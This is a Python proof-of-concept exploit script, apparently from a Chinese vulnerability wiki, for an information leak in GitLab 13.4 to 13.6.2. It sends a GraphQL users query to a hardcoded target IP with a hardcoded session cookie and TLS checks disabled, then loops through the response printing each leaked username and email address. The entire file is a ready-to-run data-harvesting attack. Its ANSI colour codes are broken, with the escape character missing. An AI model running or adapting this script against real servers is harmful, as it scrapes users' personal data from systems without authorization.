import requests
import sys
import random
import re
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  33[34mPOC_Des: http://wiki.peiqi.tech                                   33[0m')
    print('+  33[34mVersion: GitLab 13.4 - 13.6.2                                     33[0m')
    print('+  33[36m使用格式:  python3 poc.py                                            33[0m')
    print('+  33[36mUrl         >>> http://xxx.xxx.xxx.xxx                             33[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/graphql"
    user_number = 1
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json",
        "session": ".eJwljttqwkAURf9lngudzH0CfdA0NmI1aojVJ5nJOWPFtoHEeKH03x3o216wWaxfsg8d9p8kPXcDPpH9EUhKuBccGyG5Saz0VlDKvVHaWWYgcM-lZkJqUIqDaYAFjG-NHpW0qD26Jjhk4IMFzwQPlCmGFjQFFGiiHBRHGpGJRFNrgnFSCxcCOmcSLxSJIUOP3X8Ni3huT_gTtxYyned1Nl1lIyfCfed3Rd_OyjEYuObPb1WxuUTR0hSrme5OfDKv8vt1emhYteWjBbu9Z2LZ1h-A6vWLX7pSb26r7Xj4Pi4m9XpdFsnhhfw9ADimUz4.YXY5Og.pvcMAxuO7p82W_-5kQHmr0R5EPY"
    }
    try:
        data = """
        {"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
        """
        print(data)
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data ,verify=False, timeout=5)
        print(response.content.decode())
        if "email" in response.text and "username" in response.text and "@" in response.text and response.status_code == 200:
            print('33[32m[o] 目标{}存在漏洞, 泄露用户邮箱数据....... 33[0m'.format(target_url))
            for i in range(0,999):
                try:
                    username = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["username"]
                    email = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["email"]
                    user_number = user_number + 1
                    print('33[34m[o] 用户名:{} 邮箱:{} 33[0m'.format(username, email))
                except:
                    print("33[32m[o] 共泄露{}名用户邮箱账号 33[0m".format(user_number))
                    sys.exit(0)
        else:
            print("33[31m[x] 不存在漏洞 33[0m")
            sys.exit(0)
    except Exception as e:
        print("33[31m[x] 请求失败 33[0m", e)


if __name__ == '__main__':
    title()
    target_url = "http://202.38.93.111:15001/"
    POC_1(target_url)